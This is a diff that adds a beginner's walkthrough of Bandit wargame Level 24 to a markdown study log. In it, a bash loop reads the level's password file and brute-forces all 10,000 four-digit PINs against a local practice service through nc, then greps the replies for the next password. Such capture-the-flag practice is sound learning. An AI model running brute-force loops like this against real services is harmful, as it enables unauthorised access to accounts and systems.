@@ -293,3 +293,41 @@ In Levels 17–23, I practiced several important Linux and cybersecurity concept
 
 The most interesting part was learning how Linux permissions and automated scripts work together.
 
+### Level 24
+
+Goal: Find the next password by trying all 4-digit PINs from 0000 to 9999.
+
+First, I created a temporary directory and used `nano` to make `solve.sh`.
+
+```bash
+workdir=$(mktemp -d)
+cd "$workdir"
+nano solve.sh
+```
+
+Then, I wrote this script:
+
+```bash
+#!/bin/bash
+
+password=$(cat /etc/bandit_pass/bandit24)
+
+for i in {0..9999}; do
+    printf "%s %04d\n" "$password" "$i"
+done
+```
+
+After that, I ran the script and sent the output to port 30002 using `nc`. I saved the results to `result.txt` because there were too many messages in my terminal.
+
+```bash
+bash solve.sh | nc localhost 30002 > result.txt
+```
+
+Finally, I used `grep` to find the next password.
+
+```bash
+grep -v "Wrong" result.txt
+```
+
+Why: The `for` loop generates all 10,000 PINs, and `printf "%04d"` makes each PIN four digits. `nc` sends them to the server, and `>` saves the responses to a file. `grep -v` removes lines containing "Wrong", so I could find the correct password.
+
